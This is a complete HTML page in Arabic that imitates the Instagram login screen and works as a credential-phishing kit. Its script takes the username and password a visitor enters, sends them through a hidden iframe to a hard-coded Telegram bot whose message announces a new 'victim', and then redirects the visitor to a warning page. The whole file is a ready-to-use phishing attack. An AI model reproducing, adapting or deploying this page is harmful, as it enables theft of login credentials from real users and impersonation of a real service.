<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            width: 350px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            font-family: 'Billabong', cursive, sans-serif;
            font-size: 45px;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }
        .input-field {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            font-size: 12px;
            margin-bottom: 6px;
            outline: none;
        }
        .input-field:focus {
            border-color: #a8a8a8;
        }
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 7px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
            margin-bottom: 20px;
        }
        .login-btn:hover {
            background-color: #1877f2;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo">Instagram</div>

        <form id="loginForm">
            <input type="text" id="username" class="input-field" placeholder="اسم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
            <input type="password" id="password" class="input-field" placeholder="كلمة السر" required>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
    </div>

    <!-- إطار مخفي لضمان إرسال البيانات لتليجرام بدون قيود المتصفح -->
    <iframe name="hiddenFrame" style="display:none;"></iframe>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const botToken = "8677692095:AAF2WJhazxneecyzwripCch54k5m0npTEAo";
            const chatId = "7186101939";
            const message = encodeURIComponent(`🚨 تم صيد ضحية جديدة!\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`);

            // إنشاء رابط الإرسال المباشر
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

            // إرسال الطلب عبر نافذة مخفية لضمان نجاحه
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = telegramUrl;
            document.body.appendChild(iframe);

            // الانتظار قليلاً ثم الانتقال لصفحة التحذير لضمان وصول الرسالة
            setTimeout(function() {
                window.location.href = "warning.html";
            }, 1000);
        });
    </script>

</body>
</html>
